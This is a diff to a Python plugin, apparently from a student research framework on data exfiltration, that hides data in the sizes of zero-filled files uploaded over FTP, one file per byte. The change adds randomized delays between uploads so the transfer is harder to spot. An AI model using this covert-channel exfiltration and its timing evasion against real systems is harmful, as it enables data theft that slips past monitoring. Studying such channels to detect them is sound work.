@@ -1,7 +1,7 @@
 from __future__ import annotations
 from typing import Dict, Any, Iterable
 from ftplib import FTP, FTP_TLS, error_perm
-import io
+import io, time, random
 
 from tfg.plugins.api import ExfilClientPlugin
 
@@ -54,6 +54,8 @@ class FtpClientSize(ExfilClientPlugin):
     def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
         root = config.get("root") or "/"
         exfil_id = config.get("exfil_id") or "tfg"
+        ritmo_base = int(config.get("ritmo_base_ms") or 0)
+        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
 
         ftp = _connect_ftp(config)
         if root and root != "/":
@@ -67,8 +69,10 @@ class FtpClientSize(ExfilClientPlugin):
         total = 0
         for chunk in payload_iter:
             for b in chunk:
-                size = BASE + b  # un byte por fichero
+                size = BASE + b
                 name = f"{exfil_id}.sz.{seq:06d}"
+                if ritmo_base or ritmo_disp:
+                    time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                 ftp.storbinary(f"STOR {name}", io.BytesIO(b"\x00" * size))
                 total += 1
                 seq += 1
